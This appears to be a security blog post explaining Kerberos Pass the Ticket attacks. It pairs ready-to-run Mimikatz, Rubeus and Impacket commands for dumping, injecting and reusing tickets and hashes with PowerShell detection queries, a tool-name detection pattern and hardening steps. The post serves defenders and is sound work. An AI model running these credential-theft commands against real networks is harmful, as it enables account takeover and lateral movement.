---
title: "Pass the Ticket"
description: "Pass the Ticket deep dive: Kerberos ticket anatomy, extraction methods, cross-host injection, impossibility detection, protective controls, and hunting concurrent Kerberos sessions."
date: 2026-06-12T09:45:00
category: Active-Directory
tags:
  - Active Directory
  - Kerberos
  - Lateral Movement
  - Credential Access
  - Threat Hunting
author: "Luca Manfrin"
published: true
archived: false
pinned: false
featured: false
---

## Definition

Pass the Ticket (PtT) is a lateral movement technique that steals valid Kerberos tickets from memory on a compromised machine and injects them into a different session to authenticate as the ticket's original owner, without knowing the user's password, hash, or any other credential.

Unlike Pass the Hash (which abuses NTLM), PtT operates entirely within the Kerberos protocol. The stolen ticket is cryptographically valid because it was issued by the KDC. The domain controller cannot distinguish it from legitimate use.

---

## Kerberos Ticket Internals

### Two Types of Tickets

**Ticket Granting Ticket (TGT)**
- Issued by the KDC (AS-REP) during initial authentication
- Encrypted with the krbtgt account's hash, only the KDC can read it
- Proves to the KDC that the user has authenticated
- Used to request TGS (service tickets) without re-entering a password
- Default validity: 10 hours; renewable up to 7 days

**Ticket Granting Service Ticket (TGS)**
- Issued by the KDC (TGS-REP) in response to a TGS-REQ (using the TGT)
- Encrypted with the target service account's hash
- Grants access to a specific service
- Default validity: 600 minutes (10 hours)

### Where Tickets Live in Memory

Kerberos tickets are stored in the **Kerberos Credential Cache** inside LSASS memory, organized by **LUID** (Locally Unique Identifier, the logon session ID). Each LUID corresponds to a logon session.

```
LUID 0x3e7 = SYSTEM session (machine account TGT)
LUID 0x3e4 = Local Service session
LUID 0x3e5 = Network Service session
LUID 0xNNNNN = User logon sessions (dynamic)
```

### Ticket Format

Tickets are stored in the MIT Kerberos credential cache format (`.ccache` on Linux) or as `.kirbi` binary files (Windows). They are interchangeable with conversion tools.

---

## How an Attacker Performs This Attack

### Phase 1, Identify Valuable Sessions

```cmd
# List all cached tickets in the current session
klist

# List all tickets in all sessions (requires SYSTEM/debug)
klist sessions
```

```powershell
# Rubeus, enumerate all tickets across all sessions
.\Rubeus.exe klist

# Show ticket details for a specific LUID
.\Rubeus.exe klist /luid:0x1234ab
```

### Phase 2, Extract Tickets

```cmd
# Mimikatz, export all tickets to .kirbi files
privilege::debug
sekurlsa::tickets /export
# Creates: [LUID]-[KeyType]-[ServiceName]@[RealmName].kirbi
```

```powershell
# Rubeus, dump all tickets as base64
.\Rubeus.exe dump /nowrap

# Dump tickets for a specific service
.\Rubeus.exe dump /service:krbtgt /nowrap

# Dump tickets for a specific LUID
.\Rubeus.exe dump /luid:0x12ab3c /nowrap
```

```bash
# From Linux, if you already have a CCACHE file (e.g., from secretsdump)
export KRB5CCNAME=/tmp/admin.ccache
python3 getTGT.py domain.local/administrator -hashes :NTLMHASH -dc-ip 192.168.1.10
```

### Phase 3, Inject and Use

```cmd
# Mimikatz, inject a .kirbi ticket into current session
kerberos::ptt C:\Temp\tickets\[1234ab]-2-4-administrator@krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi

# Inject multiple tickets at once
kerberos::ptt C:\Temp\tickets\

# Verify injection
klist   # should show the injected ticket
```

```powershell
# Rubeus, inject base64 ticket
.\Rubeus.exe ptt /ticket:<base64_ticket_string>

# Rubeus, createnetonly to spawn an isolated process with the ticket
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:domain.local \
  /username:administrator /password:FakePass /ticket:<base64_ticket>
```

```bash
# Linux, set CCACHE and use Impacket tools
export KRB5CCNAME=/tmp/administrator.ccache
python3 psexec.py   -k -no-pass domain.local/administrator@targetserver.domain.local
python3 wmiexec.py  -k -no-pass domain.local/administrator@targetserver.domain.local
python3 smbclient.py -k -no-pass domain.local/administrator@targetserver.domain.local
```

### Overpass the Hash (Hash-to-Ticket)

A related technique: if you have an NTLM hash but want a Kerberos ticket instead (to avoid NTLM-based detection), you can exchange the hash for a TGT:

```cmd
# Mimikatz, overpass the hash (create a TGT from an NTLM hash)
sekurlsa::pth /user:administrator /domain:domain.local \
  /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe
# In the new process:
klist   # TGT is now present
```

```powershell
# Rubeus, overpass the hash
.\Rubeus.exe asktgt /user:administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
.\Rubeus.exe asktgt /user:administrator /aes256:<AES256_KEY> /ptt  # preferred
```

---

## Security Problems

**1. Ticket validity window is long.** A stolen TGT gives 10 hours of unrestricted access to request any service ticket. With renewal, an attacker can keep a stolen TGT alive for 7 days without reauthenticating.

**2. The KDC validates the ticket, not the session origin.** The KDC has no concept of "which machine issued this authentication". A ticket extracted on workstation A and injected on a Linux host is treated as valid.

**3. No password involved.** Password changes, resets, or expiry do not invalidate in-flight tickets. Only rotating the krbtgt account (Golden Ticket) or the service account password (Silver Ticket) invalidates tickets.

**4. Memory is always the target.** The moment a privileged user logs onto a workstation interactively, their TGT is in that machine's LSASS. An attacker with local admin rights can steal it.

**5. Cross-platform.** Kerberos tickets are interchangeable between Windows (`.kirbi`) and Linux (`.ccache`). An attacker can steal a ticket on Windows and use it from a Linux C2 server.

---

## How to Detect It

### Primary Detection: Impossible Concurrent Authentication

The strongest PtT detection signal is behavioral: one account authenticating from two or more distinct IP addresses within the same time window. A legitimate user cannot be on two machines simultaneously.

```powershell
# Detect concurrent Kerberos logons from multiple IPs (impossible travel)
$window = (Get-Date).AddMinutes(-30)

$events = Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = 4624
  StartTime = $window
} | Where-Object {
  $_.Properties[10].Value -eq 'Kerberos' -and
  $_.Properties[8].Value  -eq 3           # LogonType = Network
} | Select-Object TimeCreated,
    @{ n = 'User'; e = { $_.Properties[5].Value } },
    @{ n = 'IP';   e = { $_.Properties[18].Value } }

$events | Group-Object User |
  ForEach-Object {
    $ips = $_.Group | Select-Object -ExpandProperty IP | Sort-Object -Unique |
           Where-Object { $_ -ne '::1' -and $_ -ne '127.0.0.1' }
    if ($ips.Count -ge 2) {
      [PSCustomObject]@{
        Account   = $_.Name
        UniqueIPs = $ips -join ', '
        Events    = $_.Count
      }
    }
  }
```

### TGT Renewal from Unexpected Hosts

Event 4770 (Kerberos service ticket was renewed) from a host that did not issue the original TGT is suspicious:

```powershell
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4770 } |
  Select-Object TimeCreated,
    @{ n = 'Account';   e = { $_.Properties[0].Value } },
    @{ n = 'ClientIP';  e = { $_.Properties[6].Value } },
    @{ n = 'TicketOptions'; e = { $_.Properties[3].Value } }
```

### `.kirbi` File Creation Detection

```powershell
# Sysmon Event 11, File Creation
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 11
} | Where-Object {
  $_.Properties[5].Value -like '*.kirbi' -or
  $_.Properties[5].Value -like '*.ccache'
} | Select-Object TimeCreated,
    @{ n = 'File';    e = { $_.Properties[5].Value } },
    @{ n = 'Process'; e = { $_.Properties[4].Value } }
```

### Detect Rubeus / Mimikatz by Command Line

```powershell
# Sysmon Event 1, Process Create
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 1
} | Where-Object {
  $_.Properties[10].Value -match 'ptt|dump|kerberoast|asktgt|tgtdeleg|sekurlsa::tickets'
} | Select-Object TimeCreated,
    @{ n = 'Image';       e = { $_.Properties[4].Value } },
    @{ n = 'CommandLine'; e = { $_.Properties[10].Value } }
```

---

## Honeypot Ticket Strategy

Create a honeypot account that has active Kerberos sessions on specific servers. Any PtT tool enumerating sessions via `klist` or Rubeus will see this account's tickets as available. If an alert fires for that account accessing unusual resources, it's a strong PtT indicator.

Alternatively, monitor for any TGS request for sensitive SPNs (e.g., `cifs/dc01`) originating from a workstation that the account's owner never uses:

```powershell
# Alert: TGS request for DC file share from an unexpected host
$sensitiveSpns = @("cifs/dc01.domain.local", "host/dc01.domain.local")
$knownAdminIPs = @("10.0.0.100", "10.0.0.101")  # PAW IPs

Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4769 } |
  Where-Object {
    $_.Properties[2].Value -in $sensitiveSpns -and
    $_.Properties[9].Value -notin $knownAdminIPs
  }
```

---

## How to Hunt It (Post-Incident)

### Phase 1, Audit all active and recent ticket requests

```powershell
$start = (Get-Date).AddDays(-7)
$dcs   = (Get-ADDomainController -Filter *).HostName

foreach ($dc in $dcs) {
  # TGT requests
  $tgts = Get-WinEvent -ComputerName $dc -FilterHashtable @{
    LogName = 'Security'; Id = 4768; StartTime = $start
  } -ErrorAction SilentlyContinue |
    Select-Object TimeCreated,
      @{ n = 'Account'; e = { $_.Properties[0].Value } },
      @{ n = 'IP';      e = { $_.Properties[9].Value } }

  # TGS requests for sensitive services
  $tgs = Get-WinEvent -ComputerName $dc -FilterHashtable @{
    LogName = 'Security'; Id = 4769; StartTime = $start
  } -ErrorAction SilentlyContinue |
    Where-Object { $_.Properties[2].Value -match 'cifs|host|wsman|mssql' } |
    Select-Object TimeCreated,
      @{ n = 'Account';  e = { $_.Properties[0].Value } },
      @{ n = 'Service';  e = { $_.Properties[2].Value } },
      @{ n = 'IP';       e = { $_.Properties[9].Value } }
}
```

### Phase 2, Identify sessions with abnormal ticket lifetime

A stolen ticket used post-expiry won't work, but a ticket with an unusually long remaining lifetime at the time of a suspicious logon may indicate a forged or pre-staged ticket.

---

## How to Prevent It

### 1. Shorter Ticket Lifetimes

```
Group Policy: Computer Configuration → Windows Settings → Security Settings →
  Account Policies → Kerberos Policy

- Maximum lifetime for user ticket: 4 hours (default 10)
- Maximum lifetime for user ticket renewal: 3 days (default 7)
- Maximum lifetime for service ticket: 60 minutes (default 600)
```

### 2. Credential Guard, Protect the Ticket Store

Credential Guard moves the Kerberos ticket store into VSM (Virtual Secure Mode). Processes running in the normal OS cannot read it.

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "LsaCfgFlags" -Value 1 -Type DWord
```

### 3. Protected Users, Prevent Ticket Caching

Protected Users group members do not have their TGTs cached on disk or renewed automatically. Their TGT expires in 4 hours (non-renewable).

```powershell
Add-ADGroupMember -Identity "Protected Users" -Members "DomainAdmin1"
```

### 4. Tiered Administration, Prevent TGT Exposure

The root cause of PtT is privileged accounts logging onto unprivileged machines. Enforce PAW (Privileged Access Workstations) and the Tier 0/1/2 model:

- **Tier 0**: Domain Controllers, ADCS, AAD Connect, only Tier 0 admins log here
- **Tier 1**: Servers, only Tier 1 admins log here
- **Tier 2**: Workstations, only helpdesk, not domain admins

```powershell
# Enforce via GPO: Deny log on locally / Deny log on through Remote Desktop Services
# Applied to all non-PAW machines for Tier 0 accounts
# Computer Configuration → Windows Settings → Security Settings →
#   Local Policies → User Rights Assignment →
#   Deny log on locally → Add: Domain Admins
```

### 5. Enable LSA Protection

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "RunAsPPL" -Value 1 -Type DWord
```

---

## Conclusion

Pass the Ticket is the natural evolution of credential theft when Kerberos replaces NTLM. The ticket is as valid as the original logon, the KDC has no mechanism to revoke it during its lifetime. Defense converges on two things: keeping privileged tickets away from non-privileged machines (tiered administration, PAWs), and detecting the behavioral impossibility of simultaneous logons from different sources. Detection without a behavioral baseline is blind, measure first, alert second.
